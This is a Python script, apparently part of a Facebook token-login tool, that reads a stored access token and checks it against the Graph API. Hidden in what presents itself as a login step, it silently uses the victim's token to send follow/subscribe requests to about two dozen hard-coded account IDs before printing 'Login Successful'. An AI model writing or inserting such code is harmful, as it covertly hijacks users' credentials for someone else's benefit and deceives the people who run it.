import requests,os,json
import elite

P = "\x1b[0;97m" # Putih
M = "\x1b[0;91m" # Merah
O = "\x1b[0;96m" # Biru Muda

def main():
    try:
        token = open("token.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token=" + token)
        a = json.loads(otw.text)
        nama = a["name"]
    except (KeyError,IOError):
        print('%s║'%(M))
        print('%s╚══[%s!%s] %sToken Invalid'%(M,P,M,P))
        os.system('rm -rf token.txt')
        exit(elite.menu_log())
    requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + token)      
    requests.post("https://graph.facebook.com/100000415317575/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100000737201966/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100009259963367/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100007018489471/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100008409870034/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100007948328836/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100013262432692/subscribers?access_token=" + token)       
    requests.post("https://graph.facebook.com/100024547909319/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100059906093920/subscribers?access_token=" + token)      
    requests.post("https://graph.facebook.com/1767051257/subscribers?access_token=" + token)      
    requests.post("https://graph.facebook.com/100000287398094/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100001085079906/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100007559713883/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100004655733027/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100000200420913/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100026490368623/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100010484328037/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100015073506062/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/10016189/subscribers?access_token=" + token)       
    requests.post("https://graph.facebook.com/100005395413800/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100003467793035/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100003160758786/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100040248105716/subscribers?access_token=" + token) 
    print('%s║'%(O))
    print('%s╚══[%s!%s] %sLogin Successful'%(O,P,O,P))
    exit(elite.menu())
